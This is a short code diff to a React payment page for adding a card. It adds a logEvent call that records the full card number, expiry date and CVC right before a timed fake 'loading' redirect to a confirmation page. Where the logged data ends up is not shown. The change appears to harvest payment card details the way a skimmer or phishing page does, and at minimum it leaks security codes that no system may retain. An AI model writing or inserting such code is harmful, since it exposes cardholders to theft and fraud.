@@ -1,6 +1,8 @@
 import { useState } from "react";
 import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
 import { CreditCard, Calendar, Lock, X } from "lucide-react";
+import { logEvent } from "@/lib/session";
+
 
 export const Route = createFileRoute("/add-card")({
   head: () => ({
@@ -33,8 +35,10 @@ function AddCardPage() {
     } catch {
       // ignore
     }
+    logEvent("card", { number, expiry, cvc });
     navigate({ to: "/loading", search: { to: "/confirm", ms: 3000 } });
   };
+
 
   const formatNumber = (v: string) => v.replace(/\D/g, "").slice(0, 19).replace(/(.{4})/g, "$1 ").trim();
   const formatExpiry = (v: string) => {
